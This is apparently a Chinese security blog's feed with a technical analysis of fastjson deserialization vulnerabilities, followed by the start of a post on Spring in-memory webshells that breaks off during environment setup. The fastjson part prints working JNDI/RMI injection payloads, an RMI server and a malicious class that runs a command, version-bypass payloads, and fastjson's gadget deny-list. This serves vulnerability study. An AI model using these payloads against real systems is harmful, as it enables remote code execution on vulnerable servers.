alt="image-20221219204845168"></p><p>ParserConfig.getDeserializer()经过一系列的判断，由于TemplatesImpl类都不在if判断的条件范围内，所以会创建一个<code>JavaBeanDeserializer</code>。都获取到了对应的反序列化器之后，正式开始进行反序列化。</p><p><code>JavaBeanDeserializer.parseField()</code> 方法中利用smartMatch对我们传入的属性进行了模糊匹配</p><p>然后调用<code>getFieldDeserializer</code>，在<code>sortedFieldDeserializers</code> 中找到<code>getOutputProperties</code> 方法，并且进行返回</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221219204300688.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221219204300688.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221219204300688"></p><p>然后调用反射触发getOutputProperties,进而转到TemplatesImpl链</p><h4 id="fastjson1-2-24修复"><a href="#fastjson1-2-24修复" class="headerlink" title="fastjson1.2.24修复"></a>fastjson1.2.24修复</h4><p>在DefaultJSONParser.parseObject中将加载类的<code>TypeUtils.loadClass</code>方法替换为了<code>this.config.checkAutoType()</code>方法。并在此方法增加了白名单+黑名单，以下类传入parseObject都会被禁</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">bsh</span><br><span class="line">com<span class="selector-class">.mchange</span></span><br><span class="line">com<span class="selector-class">.sun</span>.</span><br><span class="line">java<span class="selector-class">.lang</span><span class="selector-class">.Thread</span></span><br><span class="line">java<span class="selector-class">.net</span><span class="selector-class">.Socket</span></span><br><span class="line">java<span class="selector-class">.rmi</span></span><br><span class="line">javax<span class="selector-class">.xml</span></span><br><span class="line">org<span class="selector-class">.apache</span><span class="selector-class">.bcel</span></span><br><span class="line">org<span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.beanutils</span></span><br><span class="line">org<span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.collections</span><span class="selector-class">.Transformer</span></span><br><span class="line">org<span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.collections</span><span class="selector-class">.functors</span></span><br><span class="line">org<span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.collections4</span><span class="selector-class">.comparators</span></span><br><span class="line">org<span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.fileupload</span></span><br><span class="line">org<span class="selector-class">.apache</span><span class="selector-class">.myfaces</span><span class="selector-class">.context</span><span class="selector-class">.servlet</span></span><br><span class="line">org<span class="selector-class">.apache</span><span class="selector-class">.tomcat</span></span><br><span class="line">org<span class="selector-class">.apache</span><span class="selector-class">.wicket</span><span class="selector-class">.util</span></span><br><span class="line">org<span class="selector-class">.codehaus</span><span class="selector-class">.groovy</span><span class="selector-class">.runtime</span></span><br><span class="line">org<span class="selector-class">.hibernate</span></span><br><span class="line">org<span class="selector-class">.jboss</span></span><br><span class="line">org<span class="selector-class">.mozilla</span><span class="selector-class">.javascript</span></span><br><span class="line">org<span class="selector-class">.python</span><span class="selector-class">.core</span></span><br><span class="line">org<span class="selector-class">.springframework</span></span><br></pre></td></tr></table></figure><h2 id="fastjson-jdbcRowSetImpl链"><a href="#fastjson-jdbcRowSetImpl链" class="headerlink" title="fastjson jdbcRowSetImpl链"></a>fastjson jdbcRowSetImpl链</h2><p>版本：fastjson&lt;&#x3D;1.2.24</p><p>刚才讲的fastJson TemplatesImpl链需要设置Feature.SupportNonPublicField。条件太过苛刻。</p><p>POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"><span class="keyword">import</span> fastjsonvuln.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FJPoC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">PoC</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/refObj\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(PoC);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RMI Server：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">refObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;whatever&quot;</span>, <span class="string">&quot;EvilObject&quot;</span>, <span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">        System.out.println(refObj);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">refObjWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(refObj);</span><br><span class="line">        registry.bind(<span class="string">&quot;refObj&quot;</span>, refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>恶意类Evil:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilObject</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilObject</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>源码大致分析：</li></ul><p>反序列化入口也就是JSON.parse()</p><p>自动调用@type指定类的setter，这里指定的类为<code>com.sun.rowset.JdbcRowSetImpl</code>，在该类下有setAutoCommit()方法：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220151427760.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220151427760.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221220151427760"></p><p>setAutoCommit方法调用了connect函数，在connect函数中，可以看到jndi的初始化<code>InitialContext()</code>，然后<code>lookup(this.getDataSourceName())</code>。如果这里的dataSource是可控的（这里可以直接设置dataSourceName），就能触发jndi注入</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220151835059.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220151835059.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221220151835059"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220152215928.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220152215928.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221220152215928"></p><blockquote><p>1.TemplatesImpl 链 </p><ul><li>优点：当fastjson不出网的时候可以直接进行盲打（配合时延的命令来判断命令是否执行成功） </li><li>缺点：版本限制  1.2.22 起才有 SupportNonPublicField 特性，并且后端开发需要特定语句才能够触发，在使用parseObject  的时候，必须要使用 JSON.parseObject(input, Object.class,  Feature.SupportNonPublicField)</li></ul><p>2.JdbcRowSetImpl 链 </p><ul><li>优点：利用范围更广，触发更为容易 </li><li>缺点：当fastjson  不出网的话这个方法基本上不行（在实际过程中遇到了很多不出网的情况）同时高版本jdk中codebase默认为true，这样意味着，我们只能加载受信任的地址</li></ul></blockquote><h2 id="fastjson后续修复"><a href="#fastjson后续修复" class="headerlink" title="fastjson后续修复"></a>fastjson后续修复</h2><ol><li>自从1.2.25 起 autotype 默认关闭</li><li>增加 checkAutoType 方法，在该方法中扩充黑名单，同时增加白名单机制</li></ol><p>黑名单扩充了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework&quot;</span></span><br></pre></td></tr></table></figure><ul><li>1.2.25-1.2.41 poc</li></ul><p>由于autotype默认关闭，在poc之前开启autotype:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">ParserConfig</span>.<span class="title function_">getGlobalInstance</span>().<span class="title function_">setAutoTypeSupport</span>(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>在新增的checkAutoType，指向的TypeUtils.loadClass()方法对传入类进行了过滤，开头为<code>[</code> or 开头为<code>L</code>结尾为<code>;</code>会去除</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220172914052.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220172914052.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221220172914052"></p><p>poc：<code>&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/refObj\&quot;, \&quot;autoCommit\&quot;:true&#125;</code></p><p>由于<code>L</code>开头无法加载类，这里只能用<code>[</code></p><ul><li>1.2.42 poc</li></ul><p>在该fastjson版本，将checkAutoType换为了hash校验，对类的第一位和最后一位进行哈希（第一位为<code>L</code>,最后一位为<code>;</code>），这里只去除了一次，可以双写</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220173631690.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220173631690.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221220173631690"></p><p>将方法hash后与denyHashCodes（黑名单hash表）对比</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220173714814.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220173714814.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221220173714814"></p><p>看起来修复了，其实加密hash所用的算法能通过源码看到：</p><p>将类添加至字典addDeny:  可以看到使用的加密方法为<code>TypeUtils.fnv1a_64()</code></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220174430002.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220174430002.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221220174430002"></p><p>fnv1a_64():</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220174614320.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220174614320.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221220174614320"></p><p>github项目，用hash碰撞求出黑名单hash对应的类：<a href="https://github.com/LeadroyaL/fastjson-blacklist%E3%80%82%E7%BB%93%E6%9E%9C%E5%8F%91%E7%8E%B0%EF%BC%8C%EF%BC%8C%E5%B9%B6%E6%B2%A1%E6%9C%89JdbcRowSetImpl">https://github.com/LeadroyaL/fastjson-blacklist。结果发现，，并没有JdbcRowSetImpl</a></p><p>poc也只用加双写<code>L ;</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://127.0.0.1:1099/refObj&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>1.2.43修复：对双写进行了过滤</p><p>1.2.45修复：扩充黑名单</p><h2 id="fastjson1-2-25-1-2-47通杀"><a href="#fastjson1-2-25-1-2-47通杀" class="headerlink" title="fastjson1.2.25-1.2.47通杀"></a>fastjson1.2.25-1.2.47通杀</h2><p>POC：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://localhost:1099/refObj&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>该poc无视checkAutoType，还记得checkAutoType里将方法hash与黑名单hash对比吗，&amp;&amp;后面还加入了<code>getClassFromMapping()==null</code>判断</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220173714814.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220173714814.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221220173714814"></p><ul><li>源码分析：</li></ul><p>DefaultJSONParser#parser中调用了MiscCodec#deserialze方法</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220192354318.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220192354318.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221220192354318">在MiscCodec中对类进行了判断，如果为java.lang.Class类，会调用TypeUtils#loadClass来加载恶意类，所以传入类需要为java.lang.Class</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220190026560.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220190026560.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221220190026560"></p><p>在不传入java.lang.Class的loadClass:</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220194431803.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220194431803.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221220194431803"></p><p>可以看到cache值为false</p><p>在MiscCodec中调用的loadClass并未传入cache值，而该值默认true。所以顺利进入if(cache)判断里，将(className,clazz) put进mappings。</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220194803616.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221220194803616.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221220194803616"></p><p>这个时候回到最开始的<code>getClassFromMapping()==null</code>，返回false，就绕过了黑名单检测</p><p>1.2.48修复：将cache默认设置为false</p><p>参考：<a href="http://wjlshare.com/archives/1526">http://wjlshare.com/archives/1526</a></p><p><a href="https://kingx.me/Exploit-Java-Deserialization-with-RMI.html">https://kingx.me/Exploit-Java-Deserialization-with-RMI.html</a></p><p><a href="https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/">https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> fastjson </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RMI </tag>
            
            <tag> fastjson </tag>
            
            <tag> jndi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>spring内存马——Controller&amp;Interceptor</title>
      <link href="/2022/12/29/spring-nei-cun-ma-controller-interceptor/"/>
      <url>/2022/12/29/spring-nei-cun-ma-controller-interceptor/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring内存马"><a href="#Spring内存马" class="headerlink" title="Spring内存马"></a>Spring内存马</h1><p>Spring是IOC和AOP的容器框架，SpringMVC则是基于Spring功能的Web框架。</p><ul><li><p>IOC容器：IOC容器负责实例化、定位、配置应用程序对象及建立对象依赖。Spring中用BeanFactory实现</p></li><li><p>Spring作为Java框架，核心组件有三个：Core、Context、Bean。其中context又叫IOC容器；Bean构成应用程序主干，Bean就是对象，由IOC容器统一管理；Core为处理对象间关系的方法</p></li></ul><blockquote><p>依赖注入：把有依赖关系的类放到容器中，解析出这些类的实例</p></blockquote><p>spring对象间的依赖关系可以用配置文件的<code>&lt;bean&gt;</code>定义。context的顶级父类ApplicationContext继承了BeanFactory。</p><p>内存马一般的构造方式就是模拟组件注册，注入恶意组件</p><h2 id="springMVC环境搭建"><a href="#springMVC环境搭建" class="headerlink" title="springMVC环境搭建"></a>springMVC环境搭建</h2><p>新建maven项目，项目名右键添加web框架</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230113155144100.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230113155144100.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230113155144100"></p><p>配置tomcat：设置tomcat主目录以及Application context路径</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230113155425594.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230113155425594.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230113155425594"></p><p>pom.xml里加入sping MVC5.3.21以及其他依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- SpringMVC --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.21<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- 日志 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ch.qos.logback<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>logback-classic<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- ServletAPI --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- Spring5和Thymeleaf整合包 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.thymeleaf<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>thymeleaf-spring5<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.12.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在web.xml中添加DispatcherServlet。DispatcherServlet的主要作用将web请求，根据配置的URL pattern，将请求分发给Controller和View。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:SpringMVC.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在classpath，我这里是src&#x2F;main&#x2F;resources下创建SpringMVC.xml核心配置文件</p><p>创建TestController类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.springmvc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> 